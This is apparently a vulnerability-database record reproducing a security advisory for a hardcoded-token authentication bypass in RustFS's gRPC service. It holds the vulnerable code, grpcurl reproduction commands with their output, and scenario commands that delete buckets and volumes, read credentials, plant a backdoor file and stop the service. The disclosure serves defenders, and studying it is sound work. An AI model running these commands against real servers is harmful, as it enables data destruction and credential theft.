vulnerability_id: VCID-qhm3-pute-8khq
aliases:
  - CVE-2025-68926
  - GHSA-h956-rh7x-ppgj
summary: |
  RustFS has a gRPC Hardcoded Token Authentication Bypass
  ## Vulnerability Overview

  ### Description

  RustFS implements gRPC authentication using a hardcoded static token `"rustfs rpc"` that is:
  1. **Publicly exposed** in the source code repository
  2. **Hardcoded** on both client and server sides
  3. **Non-configurable** with no mechanism for token rotation
  4. **Universally valid** across all RustFS deployments

  Any attacker with network access to the gRPC port can authenticate using this publicly known token and execute privileged operations including data destruction, policy manipulation, and cluster configuration changes.

  ---

  ## Vulnerable Code Analysis

  ### Server-Side Authentication (rustfs/src/server/http.rs:679-686)

  ```rust
  #[allow(clippy::result_large_err)]
  fn check_auth(req: Request<()>) -> std::result::Result<Request<()>, Status> {
      let token: MetadataValue<_> = "rustfs rpc".parse().unwrap();  // ‚ö†Ô∏è HARDCODED!

      match req.metadata().get("authorization") {
          Some(t) if token == t => Ok(req),
          _ => Err(Status::unauthenticated("No valid auth token")),
      }
  }
  ```

  **Issues**:
  - Static token hardcoded as string literal
  - No configuration mechanism (environment variable, file, etc.)
  - Token visible in public GitHub repository
  - Identical across all installations

  ### Client-Side Authentication (crates/protos/src/lib.rs:153-174)

  ```rust
  pub async fn node_service_time_out_client(
      addr: &String,
  ) -> Result<NodeServiceClient<...>, Box<dyn Error>> {
      let token: MetadataValue<_> = "rustfs rpc".parse()?;  // ‚ö†Ô∏è SAME HARDCODED TOKEN!

      // ...

      Ok(NodeServiceClient::with_interceptor(
          channel,
          Box::new(move |mut req: Request<()>| {
              req.metadata_mut().insert("authorization", token.clone());
              Ok(req)
          }),
      ))
  }
  ```

  **Issues**:
  - Client uses identical hardcoded token
  - No secure token distribution mechanism
  - Token cannot be rotated without code changes

  ### Service Integration (rustfs/src/server/http.rs:520-521)

  ```rust
  let rpc_service = NodeServiceServer::with_interceptor(make_server(), check_auth);
  let service = hybrid(s3_service, rpc_service);
  ```

  The `check_auth` interceptor is applied to all gRPC services via `NodeServiceServer::with_interceptor`, protecting **all 50+ gRPC methods** in `node.proto` with the same weak authentication.

  ---

  ## Reproduction Steps

  ### Environment Setup

  **Test Environment**:
  - RustFS Server: `localhost:9000` (HTTP + gRPC hybrid service)
  - RustFS Console: `localhost:9001`
  - Container: `rustfs/rustfs:latest` (Docker Compose deployment)
  - Default credentials: `rustfsadmin/rustfsadmin`

  **Tools Required**:
  - `grpcurl` v1.9.3+ (gRPC command-line client)
  - RustFS proto files: `crates/protos/src/node.proto`

  ### Step 1: Verify Authentication is Enforced

  **Test 1.1: Request without authentication token**

  ```bash
  $ grpcurl -plaintext \
      -import-path /private/tmp/rustfs/crates/protos/src \
      -proto node.proto \
      -d '{}' \
      localhost:9000 node_service.NodeService/Ping
  ```

  **Expected Result**: ‚úÖ Authentication failure

  ```
  ERROR:
    Code: Unauthenticated
    Message: No valid auth token
  ```

  **Test 1.2: Request with incorrect token**

  ```bash
  $ grpcurl -plaintext \
      -H 'authorization: wrong-token-12345' \
      -import-path /private/tmp/rustfs/crates/protos/src \
      -proto node.proto \
      -d '{}' \
      localhost:9000 node_service.NodeService/Ping
  ```

  **Expected Result**: ‚úÖ Authentication failure

  ```
  ERROR:
    Code: Unauthenticated
    Message: No valid auth token
  ```

  **Conclusion**: Authentication is properly enforced - unauthorized requests are rejected.

  ---

  ### Step 2: Extract Hardcoded Token from Source Code

  **Public Source Code Analysis**:

  ```bash
  $ git clone https://github.com/rustfs/rustfs.git
  $ cd rustfs
  $ grep -rn '"rustfs rpc"' --include='*.rs'
  ```

  **Result**: ‚úÖ Token found in public source code

  ```
  rustfs/src/server/http.rs:680:    let token: MetadataValue<_> = "rustfs rpc".parse().unwrap();
  crates/protos/src/lib.rs:153:    let token: MetadataValue<_> = "rustfs rpc".parse()?;
  ```

  **Extracted Token**: `rustfs rpc`

  ---

  ### Step 3: Exploit - Authenticate Using Hardcoded Token

  **Test 3.1: Successful authentication with hardcoded token**

  ```bash
  $ grpcurl -plaintext \
      -H 'authorization: rustfs rpc' \
      -import-path /private/tmp/rustfs/crates/protos/src \
      -proto node.proto \
      -d '{}' \
      localhost:9000 node_service.NodeService/Ping
  ```

  **Result**: üîì **AUTHENTICATION BYPASSED**

  ```json
  {
    "version": "1",
    "body": "DAAAAAAABgAIAAQABgAAAAQAAAANAAAAaGVsbG8sIGNhbGxlcgAAAA=="
  }
  ```

  **Analysis**: Server accepted the hardcoded token and returned a successful response. Authentication completely bypassed.

  ---

  ### Step 4: Demonstrate Access to Sensitive Management APIs

  **Test 4.1: Server Configuration Disclosure**

  ```bash
  $ grpcurl -plaintext \
      -H 'authorization: rustfs rpc' \
      -import-path /private/tmp/rustfs/crates/protos/src \
      -proto node.proto \
      -d '{}' \
      localhost:9000 node_service.NodeService/ServerInfo
  ```

  **Result**: ‚úÖ **Complete server configuration disclosed**

  ```json
  {
    "success": true,
    "serverProperties": "n6ZvbmxpbmWsMC4wLjAuMDo5MDAwoM0DhdkjMjAyNS0xMi0xOVQwNjo1NzoxOVpAMS4wLjAtYWxwaGEuNzaggawwLjAuMC4wOjkwMDCmb25saW5llNwAGq0vZGF0YS9ydXN0ZnMwwq0vZGF0YS9ydXN0ZnMwwsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAANwAGq0vZGF0YS9ydXN0ZnMxwq0vZGF0YS9ydXN0ZnMxwsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAAdwAGq0vZGF0YS9ydXN0ZnMywq0vZGF0YS9ydXN0ZnMywsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAAtwAGq0vZGF0YS9ydXN0ZnMzwq0vZGF0YS9ydXN0ZnMzwsKib2ugACLAzwAAcxuhUAAAzwAAQCnCIAAAzwAAMvHfMAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAywAAAAAAAAAAy0BL3vAPnWekwMDOADA+/c5/XK34wwAAAwGRAZUAAAAAAAAAoIA="
  }
  ```

  **Analysis**:
  - Server returned complete configuration including storage paths, endpoint addresses, version info
  - Binary data contains sensitive internal state (MessagePack encoded)
  - Information disclosure confirmed

  **Test 4.2: Disk Information Access**

  ```bash
  $ grpcurl -plaintext \
      -H 'authorization: rustfs rpc' \
      -import-path /private/tmp/rustfs/crates/protos/src \
      -proto node.proto \
      -d '{}' \
      localhost:9000 node_service.NodeService/DiskInfo
  ```

  **Result**: ‚úÖ **Authenticated request accepted** (business logic error returned, not auth error)

  ```json
  {
    "error": {
      "code": 36,
      "errorInfo": "io error can not find disk"
    }
  }
  ```

  **Analysis**:
  - Request passed authentication (error is business logic, not authentication)
  - Proves attacker has authenticated access to sensitive system information APIs

  ---

  ## Impact Analysis

  ### Affected APIs

  All 50+ gRPC methods in `node_service.NodeService` are vulnerable:

  #### üî¥ **CRITICAL Impact - Data Destruction**
  - `DeleteBucket` - Delete production buckets
  - `DeleteVolume` - Destroy entire storage volumes
  - `DeleteUser` - Remove legitimate users
  - `DeletePolicy` - Remove access control policies
  - `DeleteServiceAccount` - Remove service accounts

  #### üî¥ **CRITICAL Impact - Configuration Manipulation**
  - `ReloadSiteReplicationConfig` - Corrupt cluster replication
  - `SignalService` - Control service lifecycle
  - `LoadPolicy` - Modify access control policies
  - `LoadPolicyMapping` - Alter policy assignments

  #### üü† **HIGH Impact - Unauthorized Data Access/Modification**
  - `ReadAll` / `ReadAt` - Read arbitrary data
  - `WriteAll` / `WriteStream` - Inject malicious data
  - `RenameFile` / `RenameData` - Manipulate file system
  - `UpdateMetadata` / `WriteMetadata` - Corrupt metadata

  #### üü† **HIGH Impact - Privilege Escalation**
  - `LoadUser` - Access user credentials
  - `LoadServiceAccount` - Access service credentials
  - `LoadGroup` - Access group memberships

  #### üü° **MEDIUM Impact - Information Disclosure**
  - `ServerInfo` - Server configuration disclosure
  - `DiskInfo` - Storage configuration disclosure
  - `GetMetrics` - Performance metrics disclosure
  - `GetBucketStats` - Bucket statistics disclosure
  - `LocalStorageInfo` - Storage system information
  - `ListBucket` - Bucket enumeration

  #### üü° **MEDIUM Impact - Cluster Operations**
  - `MakeBucket` - Unauthorized bucket creation
  - `HealBucket` - Trigger repair operations
  - `BackgroundHealStatus` - Monitor internal operations

  ### Attack Scenarios

  #### Scenario 1: Data Destruction

  ```bash
  # Enumerate all buckets
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"options": "{}"}' \
    localhost:9000 node_service.NodeService/ListBucket

  # Delete critical production bucket
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"bucket": "production-data"}' \
    localhost:9000 node_service.NodeService/DeleteBucket

  # Delete entire storage volume
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"volume": "vol1"}' \
    localhost:9000 node_service.NodeService/DeleteVolume
  ```

  **Impact**: Complete data loss, business disruption

  #### Scenario 2: Credential Harvesting

  ```bash
  # Extract user credentials
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"access_key": "admin"}' \
    localhost:9000 node_service.NodeService/LoadUser

  # Extract service account credentials
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"access_key": "service-account"}' \
    localhost:9000 node_service.NodeService/LoadServiceAccount

  # Exfiltrate IAM policies
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"name": "admin-policy"}' \
    localhost:9000 node_service.NodeService/LoadPolicy
  ```

  **Impact**: Complete IAM compromise, lateral movement

  #### Scenario 3: Backdoor Installation

  ```bash
  # Inject malicious data into system paths
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"volume": "config", "path": "backdoor.sh", "buf": "..."}' \
    localhost:9000 node_service.NodeService/WriteAll

  # Modify system configuration
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"bucket": "system", "path": ".rustfs.sys/config.json", "fi": "..."}' \
    localhost:9000 node_service.NodeService/WriteMetadata
  ```

  **Impact**: Persistent compromise, further exploitation

  #### Scenario 4: Cluster Disruption

  ```bash
  # Corrupt replication configuration
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{}' \
    localhost:9000 node_service.NodeService/ReloadSiteReplicationConfig

  # Force service restart/shutdown
  grpcurl -plaintext -H 'authorization: rustfs rpc' \
    -d '{"sig": 2}' \
    localhost:9000 node_service.NodeService/SignalService
  ```

  **Impact**: Distributed system failure, data inconsistency

  ---

  ## Exploitation Preconditions

  ### Required Conditions

  ‚úÖ **All conditions typically met in production deployments**:

  1. **Network Access**: Attacker can reach gRPC port (9000/TCP)
     - RustFS binds to `0.0.0.0` by default (all interfaces)
     - Commonly exposed for distributed node communication

  2. **Token Knowledge**: Token is publicly known
     - Available in public GitHub repository
     - Identical across all RustFS installations
     - Cannot be changed without code modification

  3. **No Additional Security Controls**:
     - No mTLS/certificate-based authentication
     - No IP whitelisting (typically)
     - No VPN/network segmentation requirements
     - No rate limiting on authentication attempts

  ### Attack Complexity

  **Complexity**: üü¢ **TRIVIAL**

  - Single `grpcurl` command with hardcoded token
  - No exploit development required
  - No timing or race conditions
  - No target-specific reconnaissance needed
  - Fully automatable
  - Works against any RustFS instance

  **Time to Exploit**: < 1 minute

  ---

  ## Security Impact

  ### Confidentiality Impact: HIGH

  - **Complete Data Disclosure**: All stored objects readable via `ReadAll`/`ReadAt`
  - **Credential Exposure**: IAM users, service accounts, policies accessible
  - **Configuration Disclosure**: Server, storage, cluster configuration leaked
  - **Metrics Exposure**: Performance and usage metrics accessible

  ### Integrity Impact: HIGH

  - **Data Modification**: Arbitrary data injection via `WriteAll`/`WriteStream`
  - **Metadata Corruption**: File metadata tampering via `WriteMetadata`
  - **Policy Manipulation**: IAM policies modifiable via `LoadPolicy`
  - **Configuration Changes**: Cluster replication config alterable

  ### Availability Impact: HIGH

  - **Data Destruction**: Buckets/volumes deletable via `DeleteBucket`/`DeleteVolume`
  - **Service Disruption**: Service controllable via `SignalService`
  - **Cluster Degradation**: Replication corruption via `ReloadSiteReplicationConfig`
  - **Resource Exhaustion**: Arbitrary data writes, bucket creation

  ---

  ## Compliance & Regulatory Impact

  ### Standards Violated

  #### PCI-DSS v4.0
  - **Requirement 6.5.3**: Broken authentication
  - **Requirement 8.2**: Strong authentication required
  - **Requirement 8.6**: Multi-factor authentication required

  #### OWASP Top 10 2021
  - **A07:2021 - Identification and Authentication Failures**
    - Use of hard-coded credentials
    - Missing or ineffective authentication

  #### NIST Cybersecurity Framework
  - **PR.AC-1**: Access control mechanisms violated
  - **PR.AC-7**: Authentication mechanisms insufficient

  #### SOC 2 Type II
  - **CC6.1**: Logical access controls inadequate
  - **CC6.6**: Credential management controls missing


  ---

  ## Proof of Concept

  ### Automated POC Script

  **File**: `audit_analysis/poc_cve_2025_008_grpc_token_working.sh`

  **Usage**:
  ```bash
  chmod +x poc_cve_2025_008_grpc_token_working.sh
  ./poc_cve_2025_008_grpc_token_working.sh [target_host:port]
  ```

  **Default Target**: `localhost:9000`

  ### POC Output Summary

  ```
  [PHASE 1] Baseline Testing
    ‚úì Without token: REJECTED (Unauthenticated)
    ‚úì With wrong token: REJECTED (Unauthenticated)

  [PHASE 2] Exploit
    ‚úì With hardcoded token "rustfs rpc": ACCEPTED ‚úÖ

  [PHASE 3] Sensitive API Access
    ‚úì ServerInfo: SUCCESS - Configuration disclosed
    ‚úì DiskInfo: SUCCESS - System information accessible

  [RESULT] VULNERABILITY CONFIRMED
  ```

  ## Acknowledgements

  RustFS would like to thank **bilisheep** from the **Xmirror Security Team** for discovering and responsibly reporting this vulnerability.
severities:
  - score: '0.03135'
    scoring_system: epss
    scoring_elements: '0.86473'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68926
  - score: '0.03135'
    scoring_system: epss
    scoring_elements: '0.8648'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68926
  - score: CRITICAL
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-h956-rh7x-ppgj
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/rustfs/rustfs
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/rustfs/rustfs
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/rustfs/rustfs/releases/tag/1.0.0-alpha.77
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/rustfs/rustfs/releases/tag/1.0.0-alpha.77
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/rustfs/rustfs/releases/tag/1.0.0-alpha.78
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/rustfs/rustfs/releases/tag/1.0.0-alpha.78
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/rustfs/rustfs/security/advisories/GHSA-h956-rh7x-ppgj
  - score: CRITICAL
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/rustfs/rustfs/security/advisories/GHSA-h956-rh7x-ppgj
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/rustfs/rustfs/security/advisories/GHSA-h956-rh7x-ppgj
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2025-12-30T17:46:43Z/
    published_at: None
    url: https://github.com/rustfs/rustfs/security/advisories/GHSA-h956-rh7x-ppgj
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68926
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68926
weaknesses:
  - CWE-287
  - CWE-798
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-68926
    reference_type:
    reference_id:
  - url: https://github.com/rustfs/rustfs
    reference_type:
    reference_id:
  - url: https://github.com/rustfs/rustfs/releases/tag/1.0.0-alpha.77
    reference_type:
    reference_id:
  - url: https://github.com/rustfs/rustfs/releases/tag/1.0.0-alpha.78
    reference_type:
    reference_id:
  - url: https://github.com/rustfs/rustfs/security/advisories/GHSA-h956-rh7x-ppgj
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-68926
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-h956-rh7x-ppgj
    reference_type:
    reference_id: GHSA-h956-rh7x-ppgj
